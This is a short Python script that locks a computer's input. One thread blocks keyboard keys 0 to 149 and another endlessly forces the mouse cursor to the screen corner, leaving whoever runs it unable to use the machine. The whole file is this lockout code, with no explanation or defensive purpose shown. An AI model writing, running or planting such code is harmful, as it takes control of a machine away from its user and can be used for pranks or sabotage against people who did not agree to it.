import os

import threading
import keyboard

from pynput.mouse import Controller


def block():
    while True:
    	Controller().position = (0, 0)


def key():
    for i in range(150):
        keyboard.block_key(i)
    exit()

def main():
    key_threading = threading.Thread(target=key).start()
    block_threading = threading.Thread(target=block).start()

    
if __name__ == '__main__':
	main()